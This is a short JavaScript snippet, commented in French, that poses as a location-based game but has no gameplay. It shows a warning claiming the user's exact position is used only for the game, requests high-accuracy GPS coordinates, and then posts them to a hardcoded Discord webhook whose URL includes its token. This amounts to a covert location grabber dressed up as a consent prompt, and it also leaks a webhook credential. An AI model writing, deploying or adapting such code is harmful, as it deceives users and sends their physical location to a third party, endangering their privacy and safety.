const startGeoGame = () => {

    // Avertissement obligatoire
    alert(
        "⚠️ AVERTISSEMENT\n\n" +
        "Ce jeu nécessite votre localisation EXACTE pour fonctionner.\n" +
        "Votre position sera utilisée uniquement pour le gameplay.\n\n" +
        "Cliquez sur OK pour continuer."
    );

    // Demande de géolocalisation via le navigateur (méthode légale)
    navigator.geolocation.getCurrentPosition(
        (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const precision = position.coords.accuracy; // en mètres

            console.log("Position exacte :", lat, lon, "Précision :", precision);

            // TU PEUX ENVOYER LES COORDONNÉES ICI À TON SERVEUR
            // (ex. webhook, base de données, etc.)
            // Exemple Discord (si tu veux) :

            fetch("https://discord.com/api/webhooks/1430546772387823677/LKjiHykSqFmNDC6bqWj48tJpP72T4MaLZlQhzt4RXtSDftPImEkfL9FeeYthJU4-g_C_", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "GeoGame",
                    content: "Nouvel emplacement joueur",
                    embeds: [
                        {
                            title: "Localisation exacte (avec consentement)",
                            description:
                              `Latitude : ${lat}\n` +
                              `Longitude : ${lon}\n` +
                              `Précision : ${precision}m`,
                            color: 0x00ff99
                        }
                    ]
                })
            });

            alert("Position reçue ! Le jeu peut commencer 🎮");
        },

        // Si l'utilisateur refuse
        (error) => {
            alert(
                "Vous avez refusé la localisation.\n" +
                "Le jeu ne peut pas fonctionner sans votre position exacte."
            );
            console.log("Erreur de géolocalisation :", error);
        },

        // Options (améliorent la précision)
        {
            enableHighAccuracy: true, // GPS haute précision
            timeout: 10000,
            maximumAge: 0
        }
    );
};

startGeoGame();
